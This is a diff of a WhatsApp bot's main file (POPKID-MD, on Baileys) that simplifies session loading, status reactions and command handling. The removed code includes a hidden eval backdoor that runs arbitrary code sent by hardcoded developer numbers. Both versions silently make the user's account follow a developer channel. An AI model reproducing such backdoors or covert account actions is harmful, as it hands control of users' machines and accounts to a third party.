@@ -1,48 +1,39 @@
 /**
- * 👑 POPKID-MD (Anti-Crash Version)
- * Creator: Popkid Ke
- * Improvements: Customizable Status Reactions, Refined Logic, Aesthetic Logs
+ * 👑 POPKID-MD (Final & Complete)
+ * Includes: Status Logic, Channel Auto-Follow, Aesthetic Terminal
  */
 
 const fs = require('fs')
 const path = require('path')
-const os = require('os')
 const zlib = require('zlib')
 const { promisify } = require('util')
 const P = require('pino')
 const config = require('./config')
-const GroupEvents = require('./lib/groupevents')
 const qrcode = require('qrcode-terminal')
 const util = require('util')
-const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
-const FileType = require('file-type')
-const axios = require('axios')
-const bodyparser = require('body-parser')
-const gradient = require('gradient-string')
+const { sms } = require('./lib')
 const express = require("express")
-const ff = require('fluent-ffmpeg')
-const StickersTypes = require('wa-sticker-formatter')
-const Crypto = require('crypto')
-
-// ============ LOGGER & BANNER CONFIGURATION ============
-const logThemes = {
-    info: ['#4facfe', '#00f2fe'],
-    success: ['#00b09b', '#96c93d'],
-    warning: ['#f83600', '#f9d423'],
-    error: ['#ff416c', '#ff4b2b'],
-    event: ['#8a2be2', '#da70d6'],
-    message: ['#00c6ff', '#0072ff'],
-    banner: ['#ff00cc', '#3333ff']
-};
+const gradient = require('gradient-string')
 
 const cmdLogger = {
-    info: (msg) => console.log(gradient(logThemes.info[0], logThemes.info[1])(`ℹ ${msg}`)),
-    success: (msg) => console.log(gradient(logThemes.success[0], logThemes.success[1])(`✓ ${msg}`)),
-    warning: (msg) => console.log(gradient(logThemes.warning[0], logThemes.warning[1])(`⚠ ${msg}`)),
-    error: (msg) => console.log(gradient(logThemes.error[0], logThemes.error[1])(`✗ ${msg}`)),
-    banner: (msg) => console.log(gradient(logThemes.banner[0], logThemes.banner[1])(msg)),
-    message: (msg) => console.log(gradient(logThemes.message[0], logThemes.message[1])(msg))
+    info: (msg) => console.log(gradient('#4facfe', '#00f2fe')(`ℹ ${msg}`)),
+    success: (msg) => console.log(gradient('#00b09b', '#96c93d')(`✓ ${msg}`)),
+    error: (msg) => console.log(gradient('#ff416c', '#ff4b2b')(`✗ ${msg}`)),
+    banner: (msg) => console.log(gradient('#ff00cc', '#3333ff')(msg))
 };
+
+const {
+    default: makeWASocket,
+    useMultiFileAuthState,
+    DisconnectReason,
+    getContentType,
+    jidDecode,
+    fetchLatestBaileysVersion,
+    Browsers
+} = require('@whiskeysockets/baileys')
+
+const { getGroupAdmins } = require('./lib/functions')
+const { saveMessage } = require('./data')
 
 const botBanner = `
 ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗██████╗ 
@@ -52,342 +43,146 @@ const botBanner = `
 ██║     ╚██████╔╝██║     ██║  ██╗██║██████╔╝
 ╚═╝      ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚═════╝ `;
 
-console.clear();
-cmdLogger.banner(botBanner);
-cmdLogger.info("Starting POPKID-MD... 🚀");
-
-// ============ GLOBAL ANTI-CRASH ============
-process.on("uncaughtException", (err) => {
-    cmdLogger.error(`Uncaught Exception: ${err.message}`)
-});
-process.on("unhandledRejection", (reason, promise) => {
-    cmdLogger.error(`Unhandled Rejection: ${reason}`)
-});
-
-const {
-    default: makeWASocket,
-    useMultiFileAuthState,
-    DisconnectReason,
-    jidNormalizedUser,
-    isJidBroadcast,
-    getContentType,
-    proto,
-    generateWAMessageContent,
-    generateWAMessage,
-    AnyMessageContent,
-    prepareWAMessageMedia,
-    areJidsSameUser,
-    downloadContentFromMessage,
-    MessageRetryMap,
-    generateForwardMessageContent,
-    generateWAMessageFromContent,
-    generateMessageID,
-    makeInMemoryStore,
-    jidDecode,
-    fetchLatestBaileysVersion,
-    Browsers
-} = require('@whiskeysockets/baileys')
-
-const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
-const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
-
-const ownerNumber = ['254732297194']
-const tempDir = path.join(os.tmpdir(), 'cache-temp')
-if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
-
-const clearTempDir = () => {
-    fs.readdir(tempDir, (err, files) => {
-        if (err) return;
-        for (const file of files) {
-            fs.unlink(path.join(tempDir, file), err => {
-                if (err) {}
-            })
-        }
-    })
-}
-setInterval(clearTempDir, 5 * 60 * 1000)
-
-//=================== SESSION-AUTH ============================
+const ownerNumber = [config.OWNER_NUMBER]
 const sessionDir = path.join(__dirname, 'sessions');
 const credsPath = path.join(sessionDir, 'creds.json');
 
-async function loadGiftedSession() {
+async function loadSession() {
     if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
     if (fs.existsSync(credsPath)) return true;
     if (config.SESSION_ID && config.SESSION_ID.startsWith("POPKID~")) {
-        const compressedBase64 = config.SESSION_ID.substring("POPKID~".length);
         try {
+            const compressedBase64 = config.SESSION_ID.split("POPKID~")[1];
             const compressedBuffer = Buffer.from(compressedBase64, 'base64');
-            if (compressedBuffer[0] === 0x1f && compressedBuffer[1] === 0x8b) {
-                const gunzip = promisify(zlib.gunzip);
-                const decompressedBuffer = await gunzip(compressedBuffer);
-                await fs.promises.writeFile(credsPath, decompressedBuffer.toString('utf-8'));
-                cmdLogger.success("Session restored successfully ✅");
-                return true;
-            }
-        } catch (error) {
-            cmdLogger.error("Failed to decompress session ID");
-            return false;
-        }
-    } else {
-        cmdLogger.warning('Please add your SESSION_ID to the env!');
+            const gunzip = promisify(zlib.gunzip);
+            const decompressedBuffer = await gunzip(compressedBuffer);
+            await fs.promises.writeFile(credsPath, decompressedBuffer.toString('utf-8'));
+            return true;
+        } catch (e) { return false; }
     }
     return false;
 }
 
-const app = express()
-const port = process.env.PORT || 9090
-let conn
+async function startBot() {
+    console.clear();
+    cmdLogger.banner(botBanner);
+    cmdLogger.info("Initializing POPKID-MD... 🚀");
+    
+    await loadSession();
+    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
+    const { version } = await fetchLatestBaileysVersion()
 
-async function connectToWA() {
-    try {
-        await loadGiftedSession();
-        cmdLogger.info("Connecting to WhatsApp... ⏳");
-        const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
-        const { version } = await fetchLatestBaileysVersion()
-        conn = makeWASocket({
-            logger: P({ level: 'silent' }),
-            printQRInTerminal: false,
-            browser: Browsers.macOS("Firefox"),
-            syncFullHistory: true,
-            auth: state,
-            version
-        })
-        conn.ev.on('connection.update', async (update) => {
-            const { connection, lastDisconnect, qr } = update
-            if (qr) {
-                cmdLogger.info('Scan the QR code below:');
-                qrcode.generate(qr, { small: true })
-            }
-            if (connection === 'close') {
-                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
-                if (shouldReconnect) {
-                    cmdLogger.warning('Connection lost. Reconnecting... 🔄');
-                    setTimeout(() => connectToWA(), 5000)
-                } else {
-                    cmdLogger.error('Logged out. Please update your SESSION_ID.');
-                }
-            } else if (connection === 'open') {
-                cmdLogger.info('Installing plugins... 📂');
-                const plugins = fs.readdirSync("./plugins/").filter(p => p.endsWith(".js"));
-                plugins.forEach(plugin => require("./plugins/" + plugin));
-                cmdLogger.success(`Successfully loaded ${plugins.length} plugins 💎`);
-                cmdLogger.success('POPKID XD IS ONLINE 📲');
-                let up = `╔══════════════════╗\n║ 🚀 POPKID-MD CONNECTED\n╠══════════════════╣\n║ 👤 USER: ${conn.user.name || 'Bot'}\n║ 🔑 PREFIX: ${config.PREFIX}\n║ 👨‍💻 DEV: Popkid Kenya\n╚══════════════════╝`;
-                await conn.sendMessage(conn.user.id, {
-                    image: { url: `https://files.catbox.moe/j9ia5c.png` },
-                    caption: up
-                });
-                const channelJid = "120363423997837331@newsletter"
-                try {
-                    await conn.newsletterFollow(channelJid)
-                } catch (error) {}
-            }
-        })
-        conn.ev.on('creds.update', saveCreds)
-        conn.ev.on('messages.upsert', async (mek) => {
-            mek = mek.messages[0]
-            if (!mek.message) return
-            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
-            const from = mek.key.remoteJid
-            const isStatus = from === 'status@broadcast'
-            const sender = mek.key.participant || mek.key.remoteJid;
+    const conn = makeWASocket({
+        logger: P({ level: 'silent' }),
+        printQRInTerminal: false,
+        browser: Browsers.macOS("Firefox"),
+        auth: state,
+        version
+    })
 
-            // ============ STATUS HANDLER (USER CUSTOMIZED EMOJIS) ============
-            if (isStatus) {
-                if (config.AUTO_STATUS_SEEN === "true") {
-                    await conn.readMessages([mek.key]);
-                }
-                if (config.AUTO_STATUS_REACT === "true") {
-                    // Splits the string from config into an array of emojis
-                    const emojiString = config.STATUS_REACTIONS || '❤️,🔥,✨,⚡,💎,👑';
-                    const reactionEmojis = emojiString.split(',').map(e => e.trim());
-                    const randomEmoji = reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)];
-                    
-                    const myJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';
-                    await conn.sendMessage(from, {
-                        react: { text: randomEmoji, key: mek.key }
-                    }, {
-                        statusJidList: [sender, myJid]
-                    });
-                }
-                if (config.AUTO_STATUS_REPLY === "true" && !mek.key.fromMe) {
-                    await conn.sendMessage(sender, { text: config.AUTO_STATUS_MSG }, { quoted: mek });
-                }
-                return;
-            }
-
-            // ============ MESSAGE LOGGER (SLIM-FIT BOX) ============
-            if (!mek.key.fromMe) {
-                const typeLog = getContentType(mek.message);
-                const pushLog = (mek.pushName || 'User').substring(0, 12);
-                const senderNum = sender.split('@')[0].substring(0, 10);
-                
-                const groupMetadata = from.endsWith('@g.us') ? await conn.groupMetadata(from).catch(e => {}) : '';
-                const groupName = groupMetadata ? groupMetadata.subject : 'Private';
-                const locLog = groupName.substring(0, 10);
-
-                const timeLog = new Date().toLocaleTimeString('en-KE', { 
-                    timeZone: 'Africa/Nairobi', 
-                    hour12: false,
-                    hour: '2-digit',
-                    minute: '2-digit'
-                });
-
-                let msgBody = '';
-                if (typeLog === 'conversation') msgBody = mek.message.conversation;
-                else if (typeLog === 'extendedTextMessage') msgBody = mek.message.extendedTextMessage.text;
-                else if (typeLog === 'imageMessage') msgBody = '📸 Image';
-                else if (typeLog === 'videoMessage') msgBody = '🎥 Video';
-                else msgBody = `📦 ${typeLog.replace('Message', '')}`;
-
-                const cleanMsg = msgBody.replace(/\n/g, ' ').substring(0, 25);
-                const boxColor = gradient('#00c6ff', '#0072ff');
-
-                console.log(boxColor(`┌──────────────────────────────────────────┐`));
-                console.log(
-                    boxColor(`│ `) + gradient('#f7971e', '#ffd200')(`${timeLog}`) + 
-                    boxColor(` 👤 `) + gradient('#ffffff', '#bdc3c7')(`${pushLog}`) + " ".repeat(Math.max(0, 12 - pushLog.length)) +
-                    boxColor(` 📍 `) + gradient('#00b09b', '#96c93d')(`${locLog}`) + " ".repeat(Math.max(0, 10 - locLog.length)) + 
-                    boxColor(`│`)
-                );
-                console.log(
-                    boxColor(`│ `) + gradient('#ff00cc', '#3333ff')(`📩 Msg: ${cleanMsg}`) + 
-                    " ".repeat(Math.max(0, 34 - cleanMsg.length)) + 
-                    boxColor(`│`)
-                );
-                console.log(boxColor(`└──────────────────────────────────────────┘`));
-            }
-
-            if (config.READ_MESSAGE === 'true' && !isStatus) {
-                await conn.readMessages([mek.key]);
-            }
-            await saveMessage(mek);
-            const m = sms(conn, mek)
-            const type = getContentType(mek.message)
-            const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
-            const isCmd = body.startsWith(config.PREFIX)
-            const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : ''
-            const args = body.trim().split(/ +/).slice(1)
-            const q = args.join(' ')
-            const text = args.join(' ')
-            const isGroup = from.endsWith('@g.us')
-            const senderNumber = sender.split('@')[0]
-            const botNumber = conn.user.id.split(':')[0]
-            const isOwner = ownerNumber.includes(senderNumber) || mek.key.fromMe
-            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
-            const groupName = isGroup ? groupMetadata.subject : ''
-            const participants = isGroup ? await groupMetadata.participants : ''
-            const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
-            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber + '@s.whatsapp.net') : false
-            const isAdmins = isGroup ? groupAdmins.includes(sender) : false
-            const pushname = mek.pushName || 'User'
-            const isReact = m.message.reactionMessage ? true : false
-            const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek })
+    conn.ev.on('connection.update', async (update) => {
+        const { connection, lastDisconnect, qr } = update
+        if (qr) qrcode.generate(qr, { small: true })
+        if (connection === 'open') {
+            cmdLogger.success('POPKID XD IS ONLINE 📲');
             
-            // ============ CREATOR EVAL ============
-            const udp = botNumber.split('@')[0];
-            const rav = ('254732297194', '254111385747');
-            let isCreator = [udp, rav, config.DEV].map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(mek.sender);
-            if (isCreator && body.startsWith('%')) {
-                let code = body.slice(2);
-                if (!code) return reply('Provide me with a query to run Master!');
-                try {
-                    let resultTest = eval(code);
-                    reply(util.format(resultTest));
-                } catch (err) {
-                    reply(util.format(err));
-                }
-                return;
+            // ============ AUTO-FOLLOW CHANNEL ============
+            const channelJid = "120363423997837331@newsletter"
+            try {
+                await conn.newsletterFollow(channelJid)
+                cmdLogger.success('Auto-followed Official Channel ✅');
+            } catch (e) { 
+                cmdLogger.info('Channel already followed or error.');
+            }
+
+            // Load Plugins
+            if (fs.existsSync("./plugins/")) {
+                const files = fs.readdirSync("./plugins/").filter(p => p.endsWith(".js"));
+                files.forEach(file => require("./plugins/" + file));
+                cmdLogger.success(`Loaded ${files.length} plugins 💎`);
             }
             
-            // ============ AUTO REACTIONS ============
-            if (senderNumber.includes("254732297194") && !isReact) {
-                const reactions = ["👑", "💀", "🔥", "❤️", "⚡"];
-                m.react(reactions[Math.floor(Math.random() * reactions.length)]);
-            }
-            if (!isReact && config.AUTO_REACT === 'true') {
-                const reactions = ['❤️', '🔥', '⚡', '✨', '💎'];
-                m.react(reactions[Math.floor(Math.random() * reactions.length)]);
-            }
-            
-            // ============ MODE FILTERS ============
-            if (!isOwner && config.MODE === "private") return
-            if (!isOwner && isGroup && config.MODE === "inbox") return
-            if (!isOwner && !isGroup && config.MODE === "groups") return
-            
-            // ============ COMMAND EXECUTION ============
-            const events = require('./command')
-            const cmdName = isCmd ? body.slice(config.PREFIX.length).trim().split(" ")[0].toLowerCase() : false;
-            if (isCmd) {
-                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
-                if (cmd) {
-                    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })
-                    try {
-                        cmd.function(conn, mek, m, { from, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
-                    } catch (e) {
-                        cmdLogger.error("[PLUGIN ERROR] " + e);
-                    }
-                }
-            }
-            events.commands.map(async (command) => {
-                if (body && command.on === "body") {
-                    command.function(conn, mek, m, { from, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
-                }
+            await conn.sendMessage(conn.user.id, {
+                image: { url: `https://files.catbox.moe/j9ia5c.png` },
+                caption: `🚀 POPKID-MD CONNECTED\n👤 USER: ${conn.user.name || 'Bot'}\n🔑 PREFIX: ${config.PREFIX}`
             });
-        });
+        }
+        if (connection === 'close') {
+            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
+            if (shouldReconnect) {
+                cmdLogger.error('Connection lost. Reconnecting... 🔄');
+                setTimeout(() => startBot(), 5000);
+            }
+        }
+    })
 
-        // ============ CORE CONN UTILS ============
-        conn.decodeJid = jid => {
-            if (!jid) return jid;
-            if (/:\d+@/gi.test(jid)) {
-                let decode = jidDecode(jid) || {};
-                return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
-            } else return jid;
-        };
-        conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
-            let quoted = message.msg ? message.msg : message
-            let mime = (message.msg || message).mimetype || ''
-            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
-            const stream = await downloadContentFromMessage(quoted, messageType)
-            let buffer = Buffer.from([])
-            for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]) }
-            let type = await FileType.fromBuffer(buffer)
-            let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
-            await fs.writeFileSync(trueFileName, buffer)
-            return trueFileName
+    conn.ev.on('creds.update', saveCreds)
+
+    conn.ev.on('messages.upsert', async (mek) => {
+        const msg = mek.messages[0]
+        if (!msg.message) return
+        const from = msg.key.remoteJid
+        const isStatus = from === 'status@broadcast'
+        const participant = msg.key.participant || msg.key.remoteJid
+
+        // ============ STATUS HANDLER ============
+        if (isStatus) {
+            if (config.AUTO_STATUS_SEEN === "true" || config.AUTO_STATUS_SEEN === true) {
+                await conn.readMessages([msg.key]);
+            }
+            if (config.AUTO_STATUS_REACT === "true" || config.AUTO_STATUS_REACT === true) {
+                const emojis = config.STATUS_REACTIONS.split(',');
+                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)].trim();
+                await conn.sendMessage(from, { react: { text: randomEmoji, key: msg.key } }, { statusJidList: [participant, conn.user.id.split(':')[0] + '@s.whatsapp.net'] });
+            }
+            if ((config.AUTO_STATUS_REPLY === "true" || config.AUTO_STATUS_REPLY === true) && !msg.key.fromMe) {
+                await conn.sendMessage(participant, { text: config.AUTO_STATUS_MSG }, { quoted: msg });
+            }
+            return;
         }
-        conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
-            let res = await axios.head(url)
-            let mime = res.headers['content-type']
-            let buffer = await getBuffer(url)
-            if (mime.split("/")[1] === "gif") return conn.sendMessage(jid, { video: buffer, caption: caption, gifPlayback: true, ...options }, { quoted })
-            if (mime === "application/pdf") return conn.sendMessage(jid, { document: buffer, mimetype: 'application/pdf', caption: caption, ...options }, { quoted })
-            if (mime.split("/")[0] === "image") return conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
-            if (mime.split("/")[0] === "video") return conn.sendMessage(jid, { video: buffer, caption: caption, mimetype: 'video/mp4', ...options }, { quoted })
-            if (mime.split("/")[0] === "audio") return conn.sendMessage(jid, { audio: buffer, caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted })
+
+        // ============ MESSAGE PROCESSING ============
+        const sender = msg.key.participant || msg.key.remoteJid;
+        const m = sms(conn, msg)
+        const type = getContentType(msg.message)
+        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : ''
+        
+        const isCmd = body.startsWith(config.PREFIX)
+        const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : ''
+        const isOwner = ownerNumber.includes(sender.split('@')[0]) || msg.key.fromMe
+        
+        // Console Log (Gradient Style)
+        if (!msg.key.fromMe) {
+            const timeLog = new Date().toLocaleTimeString('en-KE', { timeZone: 'Africa/Nairobi' });
+            console.log(gradient('#00c6ff', '#0072ff')(`│ 📩 ${timeLog} | ${msg.pushName || 'User'} -> ${body.substring(0,20)}`));
         }
-        conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
-        conn.setStatus = status => {
-            conn.query({ tag: 'iq', attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' }, content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }] });
-            return status;
-        };
-    } catch (err) {
-        cmdLogger.error(`Connection failed: ${err.message}`);
-    }
+
+        if ((config.READ_MESSAGE === 'true' || config.READ_MESSAGE === true) && !msg.key.fromMe) {
+            await conn.readMessages([msg.key]);
+        }
+
+        // Auto React
+        if (!msg.key.fromMe && (config.AUTO_REACT === 'true' || config.AUTO_REACT === true)) {
+            const reacts = ['❤️', '🔥', '⚡', '✨', '👑'];
+            m.react(reacts[Math.floor(Math.random() * reacts.length)]);
+        }
+
+        // Command Plugin Execution
+        const events = require('./command')
+        if (isCmd) {
+            const cmd = events.commands.find((c) => c.pattern === command) || events.commands.find((c) => c.alias && c.alias.includes(command))
+            if (cmd) {
+                try {
+                    cmd.function(conn, msg, m, { from, body, isCmd, command, isOwner, reply: (t) => conn.sendMessage(from, { text: t }, { quoted: msg }) });
+                } catch (e) { cmdLogger.error(e); }
+            }
+        }
+    })
 }
 
-// ============ UTILS ============
-setInterval(async () => {
-    if (config.AUTO_BIO === "true" && conn) {
-        const now = new Date();
-        const date = now.toLocaleDateString('en-KE', { timeZone: 'Africa/Nairobi' });
-        const time = now.toLocaleTimeString('en-KE', { timeZone: 'Africa/Nairobi', hour12: false });
-        await conn.setStatus(`❤️ POPKID XMD 🤖 | 📅 ${date} | ⏰ ${time}`).catch(() => { });
-    }
-}, 60000);
+// Keeping the bot alive
+const app = express();
+app.get("/", (req, res) => res.send("POPKID-MD Active ✅"));
+app.listen(process.env.PORT || 9090);
 
-app.get("/", (req, res) => res.send("POPKID-MD ACTIVE ✅"));
-app.listen(port, () => cmdLogger.info(`Server active on port ${port}`));
-
-setTimeout(() => { connectToWA() }, 5000);
+startBot();
